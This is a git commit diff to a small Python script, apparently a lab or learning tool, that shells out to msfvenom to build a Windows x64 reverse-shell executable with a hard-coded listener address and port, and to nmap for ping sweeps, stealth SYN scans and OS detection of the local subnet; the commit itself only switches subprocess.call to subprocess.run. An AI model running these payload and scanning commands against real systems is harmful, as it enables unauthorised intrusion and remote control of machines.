ac7df7f9d067358d8486881c47ba2d60ba745438
Jaime Serranzana <jcs909@gmail.com>
2021-12-20 22:44:39 -0500

    without 0 output code

--- new_code.py
+++ new_code.py
@@ -9,15 +9,15 @@ import socket # import the socket library
 
 ### HELPER FUNCTIONS ###
 def get_local():  # calls ifconfig
-    return_code = subprocess.call(['ifconfig'])
+    return_code = subprocess.run(['ifconfig'])
     print("output:", return_code)
 
 def list_payloads(): # lists all the msfvenom payloads
-    return_code = subprocess.call(['msfvenom','-l','payloads'])
+    return_code = subprocess.run(['msfvenom','-l','payloads'])
     print("output:", return_code)
 
 def windows_reverse_payload(): # creates a payload for a windows machine with all the options hard coded
-    return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
+    return_code = subprocess.run(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
     print("output:", return_code)
 
 def get_ip(): # gets ip address of local computer
@@ -34,23 +34,24 @@ def get_subnet(): # gets the first three octets of the local hosts ipv4 address 
 
 def ping_sweep(): # does a sweep of the local network using nmap
     subnet = get_subnet()
-    return_code = subprocess.call(['nmap','-sP',subnet])
+    return_code = subprocess.run(['nmap','-sP',subnet])
     return return_code
     
 def ping_scan(): # does a stealth scan for machines with open ports in the local network using nmap
     subnet = get_subnet()
-    return_code = subprocess.call(['sudo','nmap','-sS',subnet])
+    return_code = subprocess.run(['sudo','nmap','-sS',subnet])
     return return_code
 
 def os_scan(): # tries to find the os of machines on the local network
     subnet = get_subnet()
-    return_code = subprocess.call(['sudo','nmap','-O',subnet])
+    return_code = subprocess.run(['sudo','nmap','-O',subnet])
     return return_code
 
 
 ### MAIN FUNCTION ###
 def main():  # define a main function
-    print(ping_sweep())
+    return ping_sweep()
+    # print(ping_sweep())
     # pinging = ping_sweep()
     # print(pinging)
     # print(get_ip())
